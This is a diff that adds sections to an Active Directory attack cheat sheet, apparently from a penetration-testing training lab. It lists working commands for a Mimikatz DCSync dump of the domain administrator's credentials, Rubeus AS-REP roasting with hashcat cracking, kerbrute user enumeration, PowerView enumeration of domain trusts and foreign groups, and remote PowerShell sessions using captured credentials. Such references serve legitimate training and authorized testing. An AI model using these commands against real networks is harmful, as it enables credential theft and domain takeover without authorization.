@@ -564,4 +564,68 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 
 ##### DCSync Attack
 ```
+# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
+Get-DomainUser -Identity adunn | sel
+ect samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+
+# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
+Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+
+```
+##### Miscellanous Configurations
+```
+# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
+Get-DomainUser * | Select-Object samaccountname,description
+
+# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+##### ASREPRoasting
+```
+# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+
+# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+##### Trust Relationships - Child > Parent Trusts
+```
+# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
+Get-ADTrust -Filter *
+
+# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
+Get-DomainTrust
+
+# PowerView tool used to perform a domain trust mapping from a Windows-based host.
+Get-DomainTrustMapping
+```
+
+##### Trust Relationships - Cross-Forest
+```
+# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+
+# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 ```
